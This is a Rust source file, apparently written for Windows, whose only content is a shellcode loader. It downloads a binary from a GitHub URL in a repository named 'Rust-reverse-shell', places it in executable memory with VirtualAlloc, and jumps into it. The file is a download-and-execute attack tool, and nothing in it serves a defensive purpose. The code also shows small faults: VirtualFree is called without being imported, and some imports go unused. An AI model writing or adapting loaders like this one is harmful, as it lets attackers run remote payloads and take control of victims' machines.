use std::io::Cursor;
use std::process::Command;
use reqwest;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE};

fn download_shellcode(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    // Make an HTTP GET request to download the shellcode
    let response = reqwest::blocking::get(url)?;

    // Check if the request was successful
    if response.status().is_success() {
        // Read the response body (shellcode) into a vector
        let shellcode = response.bytes()?;
        Ok(shellcode.into_iter().collect())
    } else {
        Err("Failed to download shellcode".into())
    }
}

fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    // Allocate executable memory
    let addr = unsafe {
        VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if addr.is_null() {
        return Err("Failed to allocate executable memory".into());
    }

    // Copy the shellcode into allocated memory
    unsafe {
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());
    }

    // Change memory protection to execute the shellcode
    let mut old_protect = 0;
    unsafe {
        if VirtualProtect(addr, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
            return Err("Failed to change memory protection".into());
        }
    }

    // Execute the shellcode
    let shellcode_fn: fn() -> () = unsafe { std::mem::transmute(addr) };
    shellcode_fn();

    // Free allocated memory
    unsafe {
        VirtualFree(addr, 0, MEM_RELEASE);
    }

    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // URL of the remote shellcode binary
    let url = "https://raw.githubusercontent.com/Erez-Goldberg/Rust-reverse-shell/main/shellcode.bin";

    // Download the shellcode binary
    let shellcode = download_shellcode(url)?;

    // Execute the downloaded shellcode
    execute_shellcode(&shellcode)?;
    
    Ok(())
}
